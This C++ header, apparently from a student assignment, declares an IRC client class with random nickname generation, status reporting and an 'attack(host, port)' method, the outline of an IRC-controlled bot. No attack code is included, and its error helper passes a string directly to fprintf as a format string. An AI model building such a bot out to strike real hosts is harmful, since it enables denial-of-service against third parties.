#pragma once

// Includes
#include <string.h>
#include <cstdlib>
#include <vector>
#include <stdio.h>
#include <iostream>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <iterator>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <ctime>

// Namespaces
using namespace std;

// Class: connection
// Desc: Handles Commection commands to the IRC server
// Written by: James Cote
// ID: 10146559
// Tutorial: T01
class connection
{
	public: // Singleton implementation.
		connection( const string& sServerName, int iPort, const string& sChannel, string sNickName = "" );
		~connection();

		// Message Handling
		void connectToServer( const string& sNamePrefix );
		void splitString( string sInput, char delim, vector<string>& sOutput );
		void sendStatusMsg( const string& sTarget );
		bool attack( const string& sHostName, int iPort );
		
		// Message Sending/Receiving
		int getNextLine( string& sNextLine );
		int Socket_Write( string sMsg, int iSocket = -1 );

		// Getter/Setters
		bool isConnected() { return m_bConnected; }

		//* Error handler.
		inline int error( const string& sMsg )
		{
			fprintf( stderr, sMsg.c_str() );
			fprintf( stderr, "Error: %s\n", strerror( errno ) );
			return -1;
		}

	private:
		// Private Variables
		int m_iConnectedSocket, m_iPort;
		struct sockaddr_in m_sClientAddr;
		string m_sHostName, m_sChannel, m_sNickName;
		bool m_bConnected;
		stringstream m_sStream;
		int m_iCounter;

		bool connectSocket( int& iSocket, struct sockaddr_in& sAddr, 
							const string& sHostName, int iPort );

		void genRandomName( const string& sPrefix, int iNumRandomDigits, string& sRetName );
		int Socket_Read( char* pBuffer, int iBuffSize );
};
